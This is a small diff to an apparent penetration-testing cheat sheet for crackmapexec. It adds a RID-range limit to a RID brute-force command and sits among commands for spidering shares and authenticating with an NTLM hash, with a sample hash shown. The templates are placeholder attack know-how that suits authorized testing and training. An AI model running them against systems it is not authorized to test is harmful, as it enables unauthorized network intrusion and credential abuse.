@@ -390,7 +390,7 @@ sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --sessio
 # list readable share files
 sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> -M spider_plus
 # bruteforcing the RID
-sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute
+sudo crackmapexec <protocol> <target ip(s)> -u <username> -p <password> --rid-brute 10000
 # using NTLM hash (NTDS.dit) to check credentials
 # e.g., Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8a3b1fee7718533175de682804c417a:::
 sudo crackmapexec smb <target ip(s)> -u <username> -H 'LM:NT'
